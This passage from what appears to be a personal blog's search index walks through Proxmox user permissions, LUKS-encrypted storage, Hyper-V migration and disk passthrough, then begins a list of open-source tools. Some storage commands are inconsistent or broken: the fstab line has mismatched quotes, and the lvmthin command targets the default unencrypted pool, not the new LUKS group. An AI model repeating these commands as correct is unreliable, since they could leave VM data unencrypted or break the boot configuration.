pve        \u2502                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\n\u2502 builder@pam  \u2502 User to build packer templates. \u2502                \u2502 0      \u2502      0 \u2502           \u2502        \u2502      \u2502          \u2502 pam        \u2502                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\n\u2502 root@pam     \u2502                                 \u2502 root@localhost \u2502 1      \u2502      0 \u2502           \u2502        \u2502      \u2502          \u2502 pam        \u2502                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\n\u2502 testuser@pam \u2502                                 \u2502                \u2502 1      \u2502      0 \u2502           \u2502        \u2502      \u2502          \u2502 pam        \u2502                  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\nroot@pve:~#\n</code></pre> <p>We can see even though we created this user in Proxmox, they don't really exist (yet):</p> <pre><code>root@pve:~# su testuser\nsu: user testuser does not exist or the user entry does not contain all the required fields\nroot@pve:~#\nroot@pve:~#\nroot@pve:~# pveum passwd testuser@pam\nEnter new password: ************************************\nRetype new password: ************************************\nchange password failed: user 'testuser' does not exist\n</code></pre> <p>Once they've been added to the underlying OS, we can both, run as this user via a shell, AND login to Proxmox's web UI or API with them since it's aware of, and accepting, their authentication through PAM:</p> <pre><code>root@pve:~# useradd -m -s /bin/bash testuser\nroot@pve:~# passwd testuser\nroot@pve:~#\nroot@pve:~# su testuser\ntestuser@pve:/root$ cd ~\ntestuser@pve:~$ pwd\n/home/testuser\ntestuser@pve:~$ id\nuid=1001(testuser) gid=1001(testuser) groups=1001(testuser)\n</code></pre> <p>Setting Passwords</p> <p>Interestingly, both <code>passwd user</code> and <code>pveum passwd user@pam</code> can manage a shell user's login password, once they exist under PAM.</p> <p>Finally, you'll need to scope each user their permissions, either individually, or by giving permissions to a group and tying user(s) to groups, which is the recommended way to manage permissions at scale.</p>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#permissions","title":"\ud83e\udeaa Permissions","text":"<p>See, create, and modify permission assignments: Datacenter &gt; Permissions</p> <ul> <li>\ud83c\udf10 Proxmox VE Permission Management: List of Permissions</li> </ul> <p>That link lists out all predefined permission sets and what they do. The most useful if you're just getting started:</p> <ul> <li><code>Administrator</code>: has full privileges</li> <li><code>PVEVMAdmin</code>: fully administer VMs</li> <li><code>PVESysAdmin</code>: audit, system console and system logs</li> <li><code>PVEVMUser</code>: view, backup, configure CD-ROM, VM console, VM power management</li> </ul>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#packer-user-example","title":"\ud83d\udce6 Packer User Example","text":"<p>Mayfly277, one of the contributers to Game of AD, has a blog post on creating a separate user account in Proxmox to build packer VM's.</p> <p>Using these steps as a reference, we can create a more \"generic\" user and group scope using the built-in permissions and roles tied to groups, then modify them from there if needed.</p> <p>Creating Administrators and DevOps Groups + Permissions</p> <p>This walks through creating a dedicated Administrators group to not rely on the root account, and a DevOps group for packer use.</p> <ul> <li>Datacenter &gt; Permissions &gt; Groups: Create \"Administrators\" and \"DevOps\" groups</li> <li>Datacenter &gt; Permissions: Add &gt; Group Permission<ul> <li>Path: <code>/</code></li> <li>Group: Administrators</li> <li>Role: Administrator</li> <li>Propagate: \u2705</li> </ul> </li> <li>Datacenter &gt; Permissions: Add &gt; Group Permission<ul> <li>Path: <code>/</code></li> <li>Group: DevOps</li> <li>Role: PVEVMAdmin</li> <li>Propagate: \u2705</li> </ul> </li> <li>Datacenter &gt; Permissions: Add &gt; Group Permission<ul> <li>Path: <code>/</code></li> <li>Group: DevOps</li> <li>Role: PVESysAdmin</li> <li>Propagate: \u2705</li> </ul> </li> <li>Datacenter &gt; Permissions &gt; Users: Edit User &gt; Assign groups from the drop-down menu</li> </ul> <p>You can do the same using the <code>pveum</code> command line utility:</p> <pre><code># Define the groups\npveum group add Administrators -comment \"System Administrators\"\npveum group add DevOps -comment \"Infrastructure-as-code Users\"\n# Define the roles\npveum acl modify / -group Administrators -role Administrator\npveum acl modify / -group DevOps -role PVEVMAdmin\npveum acl modify / -group DevOps -role PVESysAdmin\n# Assign users, assumes these users exist in PAM\npveum user modify admin@pam -group Administrators\npveum user modify builder@pam -group DevOps\n</code></pre> <p>Permissions Scopes and Privilege Escalation</p> <p>These permissions could be locked down further, however in the example above we give the <code>builder</code> user <code>Sys.Console</code> access.</p> <p>Effectively you have sudo-less console access despite the scope for the permission path itself being <code>/</code>.</p> <ul> <li>You cannot run any <code>pve*</code> binaries, or update apt packages</li> <li>You cannot read files you do not have access to read</li> <li>There's no <code>sudo</code> by default</li> </ul> <p>You'll need something like a kernel exploit, misconfiguration in scheduled tasks, the filesystem, or services, a secret being visible in process memory with pspy, or a unique attack path on your local Proxmox configuration to \"break out\" of this shell context and have higher privileges.</p> <p>There are likely other methods not listed above, and this isn't even taking into account attacking Proxmox via the UI or API. The point is, it's not a perfect sandbox, but it's better than running devops workflows as the root account.</p> <p>To properly audit unique admin users, you'll need to install <code>sudo</code> and configure each admin user that requires sudo access.</p>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#disk-encryption","title":"\ud83d\udcbe Disk Encryption","text":"<p>NOTE: A safer approach instead of full disk encryption is to install the Proxmox OS on an unencrypted disk, and use additional storage as encrypted disks for your production VM's. Proxmox does not offer full disk encryption by default. There are some issues you can encounter with this depending on your use case.</p> <p>Mount an Encrypted Disk</p> <ul> <li>\ud83c\udf10 How to Mount Existing Disks Within proxmox</li> <li>\ud83c\udf10 Adding LUKS Encryption to proxmox</li> <li>\ud83c\udf10 Add an Existing Disk to proxmox</li> <li>\ud83c\udf10 Add a Dew Disk as LVM-thin</li> <li>\ud83c\udf10 proxmox Storage Wiki</li> <li>\ud83c\udf10 Dr Duh Yubikey Guide: Backing Up Keys on Encrypted Storage</li> </ul> <p>You can easily mount and add an encrypted disk to an existing Proxmox server over SSH or from the Proxmox server console in the Web UI. As mentioned above, a perfect example is you've installed Proxmox itself on an unencrypted drive, and have other internal drives you can encrypt with LUKS or ZFS encryption that you want to store VM's on.</p> <p>Creating a LUKS Partition</p> <p>The easiest way to do this (and the way I initially set this up) is from an Ubuntu or Debian live OS. Using the <code>disks</code> application in Ubuntu, you can easily format and create a LUKS encrypted drive. Poweroff the Proxmox server, reboot into a live USB, create  the drive, then continue.</p> <p>Alternatively, you can do this all manually from the CLI within proxmox. NOTE: this will need tested and verified.</p> <pre><code>cryptsetup luksFormat /dev/sdXY\ncryptsetup open --type luks /dev/sdXY &lt;storage-id&gt;\n# Enter a passphrase, store it in your password manager\n\n# Only create an ext4 filesystem if you need it, otherwise use lvm-thin for VM storage instead of ext4\nmkfs.ext4 /dev/mapper/luks3-lvm\n</code></pre> <p>Now that we have a LUKS partition, we can mount it.</p> <p>Get a sense of which partition(s) you'll want to add. In this case, the device is <code>sdd</code> and the partition is <code>sdd1</code>.</p> <pre><code>lsblk\n&lt;SNIP&gt;\nsdd                            8:48   0   1.8T  0 disk\n\u2514\u2500sdd1                         8:49   0   1.8T  0 part\n</code></pre> <p>Unlock an Encrypted Disk</p> <p>Unlock and mount the LUKS partition. You can make up any name for a storage ID, just stick to alphanumeric characters and hyphens <code>-</code>. Remember, you would only <code>mkdir</code> and <code>mount</code> a filesystem if you're using it as a filesystem. VM's benefit from lvm-thin data pools for more efficency than a filesystem.</p> <p>Naming the Storage ID</p> <p>If you look under Datacenter &gt; Storage, you'll see the default ID's are <code>local</code> and <code>local-lvm</code>.</p> <p>In this example, lets say you already have two other internal disks that are also LUKS encrypted.</p> <p>Since this is the third disk, we'll call it <code>luks3-lvm</code> to stick to a similar naming convention.</p> <pre><code># Example: cryptsetup open --type luks /dev/sddX &lt;storage-id&gt;\n# This is all you need if the encrypted partition is acting as a storage pool for VMs\ncryptsetup open --type luks /dev/sdd1 luks3-lvm\n\n# If this will be a filesystem and NOT an lvm-thin storage pool\nmkdir /mnt/2tb-internal3\nmount /dev/mapper/luks3-lvm /mnt/2tb-internal3\n\n# To unmount the filesystem, and close the the LUKS partition if you need to\numount /mnt/2tb-internal3\ncryptsetup close &lt;storage-id&gt;\n</code></pre> <p>To add the encrypted partition to the Proxmox data pool (basically so you see it in the GUI and can make use of it), you can use:</p> <ul> <li>Datacenter &gt; Storage &gt; Add</li> <li>ID: <code>luks3-lvm</code> (storage identifier created with cryptsetup)</li> </ul> <p>New vgname and thinpool</p> <p>Create a new volume group and thinpool for LUKS drives to share. This is because adding them to the existing volume group and thinpool means VM's and data will still be written to the unencrypted drives (if you aren't using full disk encryption).</p> <p>Ai Usage</p> <p>ChatGPT showed examples that led to posts and documentation detailing the following commands.</p> <p>...or the CLI with <code>pvesm</code>:</p> <pre><code># Helpful to visualize the pve storage\npvesm status\n\n# Create a new volume group for LUKS drives\nvgcreate luks-group /dev/mapper/luks3-lvm\nWARNING: ext4 signature detected on /dev/mapper/luks3-lvm at offset 1080. Wipe it? [y/n]: y\n  Wiping ext4 signature on /dev/mapper/luks3-lvm.\n  Physical volume \"/dev/mapper/luks3-lvm\" successfully created.\n  Volume group \"luks-group\" successfully created\n\n# If you mess up, delete the group and remake it\nvgremove luks-group\n\n# Create a new thinpool for LUKS drives to share, leaving 5% of the drive for metadata\nlvcreate --type thin-pool -l95%FREE -n &lt;thinpool-name&gt; &lt;vgname&gt;\nlvcreate --type thin-pool -l95%FREE -n luks-data luks-group\n  Thin pool volume with chunk size 1.00 MiB can address at most 254.00 TiB of data.\n  WARNING: Pool zeroing and 1.00 MiB large chunk size slows down thin provisioning.\n  WARNING: Consider disabling zeroing (-Zn) or using smaller chunk size (&lt;512.00 KiB).\n  Logical volume \"luks-data\" created.\n\n# Add a LUKS thin-lvm data pool for VM storage\npvesm add lvmthin luks3-lvm --vgname pve --thinpool data --content images --content rootdir # lvm-thin is more efficient than a filesystem for VM storage\n\n# Add a LUKS filesystem for backup, ISO, or other use\npvesm add dir luks3-lvm --path /mnt/2tb-internal3 --content backup # Only for backup, browsable filesystems\n</code></pre> <p>If you mess up and want to redo the pvesm, just use <code>pvesm remove &lt;storage-id&gt;</code>. Remember we came up with the storage ID when unlocking the LUKS partition during <code>cryptsetup open --type luks /dev/sddX &lt;storage-id&gt;</code>.</p> <p>Backup LUKS Headers</p> <ul> <li>\ud83c\udf10 Fedora Project: Backup LUKS Headers</li> <li>\ud83c\udf10 gitlab/cryptsetup: Backup and Data Recovery</li> <li>\ud83c\udf10 Arch Linux: LUKS Backup and Restore</li> </ul> <p>Once everything's working it's recommended to backup the headers of your LUKS devices. These are ~2MB or larger binary blobs, the first \"area\" of the LUKS disk containing the encrypted key slots and necessary data to unlock the drive. Having a backup of these is easy to store as an attachment in a password vault, and can recover a drive if anything corrupts the header.</p> <p>Ideally you have two encrypted drives that both have copies of the data, for example two LUKS drives, one for running the VMs, the other for saving backups of the VMs. It's less likely both will fail at the same time, even less so if the \"backup\" drive is an external device that isn't always connected.</p> <pre><code>cryptsetup luksHeaderBackup --header-backup-file &lt;file&gt; &lt;device&gt;\ncryptsetup luksHeaderBackup --header-backup-file /root/sddX-luks3-lvm.bin /dev/sddX\n</code></pre> <p>Header Backup Storage</p> <p>In most cases, it's fine to leave the header binary here in <code>/root</code> of the Proxmox unencrypted drive. An attacker would still need the key along with the header, and if the device itself is physically stolen, the LUKS volume itself also contains the header. This is a small trade off for having access to your header backup. Assume an attacker who could brute force your drive's key would already know how to extract the header, and has physical access.</p> <p>That said, you may choose to save the header to your password manager and delete it from proxmox.</p> <pre><code># Destroy the header file\nshred -n 7 -v /root/sddX-luks3-lvm.bin\n</code></pre> <p>Before you're done you can do two more things; if you're using this partition as a filesystem <code>type=dir</code>, or you want to use a keyfile to unlock your drives on boot, set autodecryption and set auto-mounting.</p> <p>Keyfile Storage</p> <p>Typically what you'd do is use full disk encryption on the OS drive, requiring a password over SSH with dropbear_initramfs on remote startup. This will decrypt the boot drive. This is where you would be safe to store keyfiles. Do not store keyfiles on unencrypted partitions, as it would be easy to decrypt your drives with physical or shell access.</p> <pre><code># Without a keyfile, simply map the drive but still require a passphrase\necho \"luks3-lvm UUID=$(blkid -s UUID -o value /dev/sdd1 | tr -d '\\n') none luks\" | tee -a /etc/crypttab\n\n# With a keyfile stored in the filesystem root, literally as /keyfile\necho \"luks3-lvm UUID=$(blkid -s UUID -o value /dev/sdd1 | tr -d '\\n') /keyfile luks\" | tee -a /etc/crypttab\n\n# Mount the volume as a filesystem under /mnt (we created this path eariler)\necho 'UUID=$(blkid -s UUID -o value /dev/sdd1 | tr -d '\\n') /mnt/2tb-internal3    ext4    defaults 0   2\" &gt;&gt; /etc/fstab\n</code></pre> <p>Unlocking the Drives</p> <p>From here, anytime you update and reboot the Proxmox server, you'll just need to paste this command into the terminal through the WebUI and enter your passphrase to unlock the LUKS disk. Be sure to always use the same storage ID when mounting the LUKS partition, so pvesm can access it.</p> <pre><code>cryptsetup open --type luks /dev/sddX &lt;storage-id&gt;\ncryptsetup open --type luks /dev/sddX luks3-lvm\n</code></pre> <p>That's it. It's already mapped to your pve storage manager, and remembered there.</p> <p>Full Disk Encryption</p> <p>One option is to install Debian with FDE, then install Proxmox on top of it. However it's recommended to just install Proxmox following one of the paths below.</p> <ol> <li>Install Proxmox with ZFS</li> <li>Reboot into recovery mode from the installer USB</li> <li>Follow these steps to enable ZFS encryption</li> <li>Follow these steps to install <code>dropbear-initramfs</code> for remote decryption over SSH</li> <li>Encrypt the dataset for VMs and containers (which is also step 5 in this post)</li> </ol> <p>ZFS + Dropbear, all of the resources below came from this post: FDE with ZFS</p> <ul> <li>\ud83c\udf10 Feature Request: Native ZFS encryption during Proxmox installation</li> <li>\ud83c\udf10 Encrypting Proxmox VE: Best Methods</li> <li>\ud83c\udf10 gist: FDE with Proxmox and ZFS native encryption</li> <li>\ud83c\udf10 github/openzfs: Unlocking ZFS encrypted root over SSH</li> <li>\ud83c\udf10 Proxmox VE ZFS encryption</li> </ul> <p>LUKS + Dropbear</p> <ul> <li>\ud83c\udf10 Adding LUKS FDE to Proxmox</li> </ul>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#migrating-vms","title":"\ud83d\udd00 Migrating VMs","text":"<ul> <li>\ud83c\udf10 Importing Virtual Machines</li> <li>\ud83c\udf10 Migrating Hyper-V to Proxmox</li> </ul> <p>Hyper-V</p> <p>Follow the link referenced above. Essentially, with no snapshots on the Hyper-V VM you wish to migrate (you can export the VM and import it back into Hyper-V so it's separate from your \"main\" copy, to delete the snapshots, then export it again) export your Hyper-V VM so you have the .vhdx file. Move it over to the Proxmox filesystem.</p> <p>Filesystem Space and Migrating VMs</p> <p>An external drive or larger filesystem space within Proxmox is useful here, as by default Proxmox gives its default \"filesystem\" on the OS drive roughly 100GB while leaving the remaining space to lvm-thin pool storage for VMs.</p> <p>This is not explicitly talked about in the post, but if you cannot access the .vhdx file on your Hyper-V host by mounting a share on to the Hyper-V host on Proxmox, you should use an external drive to transfer the VM. With the average size likely being over 40GB, it will take a long time to <code>scp</code>, <code>rsync</code>, or similar.</p> <p>Since the OS drive has roughly 100GB on the root filesystem, the majority of the remaining space is lvm-thin space, which is a special type of storage format efficient for VM's but lacking a filesystem.</p> <p>Both an external drive and a fileshare allow you to import the VM directly to the lvm-thin space without accidentally overruning your /root filesystem's space which can happen if you copy the VM directly onto the OS drive filesystem before importing it.</p> <p>Create the VM in Proxmox</p> <p>Create the VM as you would if you were making it from scratch, following the steps in the linked forum post (q35 for the VM type, and then detach the default disk). Use the <code>qm disk import &lt;vmid&gt; &lt;source&gt; &lt;storage&gt; [OPTIONS]</code> command to import the .vhdx file as the disk image for your Hyper-V VM.</p> <pre><code>qm disk import 105 /mnt/wd500-external/Virtualization/Wazuh/Virtual\\ Hard\\ Disks/Wazuh.vhdx luks3-lvm\nimporting disk '/mnt/wd500-external/Virtualization/Wazuh/Virtual Hard Disks/Wazuh.vhdx' to VM 105 ...\n  Logical volume \"vm-105-disk-3\" created.\ntransferred 0.0 B of 127.0 GiB (0.00%)\ntransferred 1.3 GiB of 127.0 GiB (1.00%)\ntransferred 2.5 GiB of 127.0 GiB (2.00%)\ntransferred 3.8 GiB of 127.0 GiB (3.00%)\ntransferred 5.1 GiB of 127.0 GiB (4.00%)\n&lt;SNIP&gt;\ntransferred 125.9 GiB of 127.0 GiB (99.12%)\ntransferred 127.0 GiB of 127.0 GiB (100.00%)\ntransferred 127.0 GiB of 127.0 GiB (100.00%)\nSuccessfully imported disk as 'unused1:luks3-lvm:vm-102-disk-3'\n</code></pre> <p>Add (attach) the disk under the VM's settings. Be sure to go into \"Options\", not \"Hardware\" and set this disk first in the boot order. In the event this is a Linux VM, even with SecureBoot enabled you'll be able to boot it, and get running.</p> <p>That's really it, be sure to install the <code>spice-vdagent</code> service on the guest to leverage additional virtualization features if you want them, though this is not necessary.</p> <p>Fix any issues (such as networking), poweroff, then take your first snapshot.</p>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#vm-configuration","title":"\u2699\ufe0f VM Configuration","text":""},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#virtual-nic","title":"\ud83d\udedc Virtual NIC","text":"<p>This is the equivalent of creating a virtual NIC (not to be confused with a VLAN) in VMware or VirtualBox for guest-to-guest communication (for example a LAN and OPT NIC to attach to a pfSense VM). First you need to create another Linux Bridge network device that isn't attached to any physical network ports.</p> <ul> <li>Under Datacenter, select your proxmox-ve hostname &gt; System &gt; Network &gt; Create</li> <li>Name it, check <code>[x]</code> autostart, create</li> <li>Now click \"Apply Configuration\" at the top, so your new <code>vmbrX</code> shows as \"Active: Yes\"</li> </ul> <p>Now when creating the VM:</p> <ul> <li><code>[VM Name]</code> &gt; Hardware &gt; Add &gt; Network Device</li> <li>Add two, the WAN side can be the default <code>vmbr0</code>, the LAN side is your new <code>vmbrX</code> with either <code>intel E1000</code> or <code>virtIO</code></li> <li>One will receive DHCP / access to the outside world over the Proxmox virtual brdige</li> <li>The other will remain purely virtual (for example pfSense could then provide DHCP to that NIC)</li> </ul>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#disk-passthrough","title":"\ud83d\udcbe Disk Passthrough","text":"<p>Say you've installed Proxmox on an existing server or workstation, either as the primary OS or next to an existing OS. You can mount any of the internal drives to VM's without any special modifications to Proxmox's kernel or boot parameters (tested on PVE-8.3.0).</p> <p>PCIe Passthrough?</p> <p>This does not cover PCIe passthrough, see this video for details on passing through entire storage controllers and GPUs.</p> <p>This type of hardware passthrough does require modifications to the kernel and reboots. It will have its own section in this guide after testing.</p> <p>The commands below are summarized from this article, on how to pass through a physical disk to a virtual machine. This can be done while the VM is live, and without rebooting the VM or Proxmox.</p> <p>In summary, first obtain the MODEL (e.g. ata-ST1000DM001-1ABCDEF) plus the SERIAL string (e.g. Z1A2B3C4) of all disks:</p> <pre><code>lsblk -o +MODEL,SERIAL,WWN\n</code></pre> <p>If you're looking for a specific disk, you'll have to recognize it by MODEL name, or if they're all the same, you may have to mount each one and review what's on it.</p> <p>Together those strings create a full path to the disk itself. Find the full path under <code>/dev/disk/by-id/</code> by searching for the SERIAL string.</p> <pre><code>ls -l /dev/disk/by-id | grep Z1A2B3C4\n</code></pre> <p>Hot-plug the disk as a new SCSI device to the VM.</p> <pre><code># Existing SCSI disks are listed as scsi0, scsi1, etc. Add this as a new disk\n# to &lt;vm-id&gt;. Use the full path to the disk like below.\nqm set &lt;vm-id&gt; --scsi&lt;int&gt; /dev/disk/by-id/&lt;model&gt;_&lt;serial&gt;\n\n# Example:\nqm set 105 --scsi2 /dev/disk/by-id/ata-ST1000DM001-1ABCDEF_Z1A2B3C4\n</code></pre> <p>Hot-unplug or remove the disk.</p> <pre><code>qm unlink 105 --idlist scsi2\n</code></pre>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#troubleshooting","title":"Troubleshooting","text":"<p>This section details issues and how to resolve them.</p>"},{"location":"blog/2024/08/13/simple-proxmox-proxmox/#uefi-causes-boot-failure","title":"UEFI Causes Boot Failure","text":"<p>Typically in Unix-like distros where UEFI is supported but Secure Boot is not, you must interrupt the boot process and turn off Secure Boot.</p> <ul> <li>During boot, when you see the Proxmox splash screen, hit <code>Esc</code></li> <li>Select <code>Device Manager</code></li> <li>Select <code>Secure Boot Configuration</code></li> <li>Uncheck <code>Attempt SecureBoot</code> with the <code>Space</code> bar</li> <li>Back out to the main UEFI menu and select <code>Continue</code></li> </ul>"},{"location":"blog/2019/07/15/-resources/","title":"\u2b50 Resources","text":"<p>Information, compiled for easy reference.</p> <p>CI/CD Your Notes</p> <p>This set of links and notes has been my longest running note file, originally started back in cherrytree before making its way to this page.</p> <p>The idea has been to create a searchable location pointing to each of these things, sorted by category, and with notes around them. This is currently a work in progess as entries need to be reformatted and updated as they move from my notes onto this page.</p> <p>AI Usage</p> <p>AI was used to port some of my existing notes out of CherryTree and Standard-Notes, by converting the original markdown formatting I had into the formatting I decided on for mkdocs-material. This choice was made due to volume as well as format inconsistencies across years of previous notes.</p>"},{"location":"blog/2019/07/15/-resources/#utilities","title":"Utilities","text":"rustdesk <p>An open source, robust remote desktop alternative, has desktop and mobile clients and is designed for self-hosting.</p> <p>This was covered by Network Chuck as an alternative to every other remote desktop option out there.</p> <ul> <li>https://github.com/rustdesk/rustdesk</li> </ul> ghostty <p>Fast, feature rich, native terminal emulator.</p> <p>This tool was mentioned on Daniel Miessler's UL NO. 463.</p> <ul> <li>https://ghostty.org/</li> <li>https://github.com/ghostty-org/ghostty</li> </ul> unfurl <p>Unfurl takes a URL and expands (\"unfurls\") it into a directed graph, extracting every bit of information from the URL and exposing the obscured. It does this by breaking up a URL into components, extracting as much information as it can from each piece, and presenting it all visually.</p> <p>Discovered in this SANS diary. This tool has both a local web interface and a command line option for viewing the data returned.</p> <ul> <li>https://github.com/obsidianforensics/unfurl</li> </ul> bubbletea <p>The fun, functional and stateful way to build terminal apps. A Go framework based on The Elm Architecture. Bubble Tea is well-suited for simple and complex terminal applications, either inline, full-window, or a mix of both.</p> <ul> <li>https://github.com/charmbracelet/bubbletea</li> </ul> Dangerzone <p>Take potentially dangerous PDFs, office documents, or images and convert them to a safe PDF.</p> <p>Dangerzone works like this: You give it a document that you don't know if you can trust (for example, an email attachment). Inside of a sandbox, Dangerzone converts the document to a PDF (if it isn't already one), and then converts the PDF into raw pixel data: a huge list of RGB color values for each page. Then, outside of the sandbox, Dangerzone takes this pixel data and converts it back into a PDF.</p> <ul> <li>https://github.com/freedomofpress/dangerzone</li> </ul> <p>List of features (from the README):</p> <ul> <li>Sandboxes don't have network access, so if a malicious document can compromise one, it can't phone home</li> <li>Sandboxes use gVisor, an application kernel written in Go, that implements a substantial portion of the Linux system call interface.</li> <li>Dangerzone can optionally OCR the safe PDFs it creates, so it will have a text layer again</li> <li>Dangerzone compresses the safe PDF to reduce file size</li> <li>After converting, Dangerzone lets you open the safe PDF in the PDF viewer of your choice, which allows you to open PDFs and office docs in Dangerzone by default so you never accidentally open a dangerous document</li> </ul> magika <p>Magika is a novel AI powered file type detection tool that relies on the recent advance of deep learning to provide accurate detection. Under the hood, Magika employs a custom, highly optimized Keras model that only weighs about a few MBs, and enables precise file identification within milliseconds, even when running on a single CPU.</p> <ul> <li>https://github.com/google/magika</li> </ul> Ladybird <p>Ladybird is a truly independent web browser, using a novel engine based on web standards.</p> <p>Discovered by following p0dalirius, this appears to be focused on *nix and macOS desktop environments for it's first release in 2026 / 2027.</p> <ul> <li>https://github.com/LadybirdBrowser/ladybird</li> </ul> topgrade <p>Discovered on Paul's Security Weekly #864. topgrade is a way to \"upgrade all the things\" on a Linux system. This includes apt/dnf, snap, flatpak, LVFS / firmware, and so on.</p> <ul> <li>https://github.com/topgrade-rs/topgrade</li> </ul> Terramaid <p>A utility for generating Mermaid diagrams from Terraform configurations.</p> <ul> <li>https://github.com/RoseSecurity/Terramaid</li> </ul> FileCloud Community Edition <p>The Community Edition is the free tier of the enterprise version, without certain enterprise features. It's geared towards home labs and personal use, while giving you expierence with the FileCloud platform.</p> <p>Uniquely, FileCloud has an MSI installer for deployment on Windows servers / desktops, and allows you to mount folders as network drives.</p> <p>Discovered on NetworkChuck's video on Building your Own Cloud.</p> <ul> <li>https://ce.filecloud.com/</li> </ul> NextCloud <p>A community driven, free and open source, self-hosted cloud solution.</p> <p>Discovered on Network Chuck's video on Building your Own Cloud. The steps demonstrated for the docker install seem to be the easiest way to get setup in a lab environment that can move to \"production\" use for a home user.</p> <ul> <li>https://github.com/nextcloud</li> </ul> opkssh <p>Discovered on the SANS ISC Daily Stormcast, Monday March 31st episode in 2025.</p> <p>opkssh is a tool which enables ssh to be used with OpenID Connect allowing SSH access management via identities like alice@example.com instead of long-lived SSH keys. It does not replace ssh, but rather generates ssh public keys that contain PK Tokens and configures sshd to verify the PK Token in the ssh public key. These PK Tokens contain standard OpenID Connect ID Tokens. This protocol builds on the OpenPubkey which adds user public keys to OpenID Connect without breaking compatibility with existing OpenID Provider.</p> <p>Currently opkssh is compatible with Google, Microsoft/Azure and Gitlab OpenID Providers (OP). If you 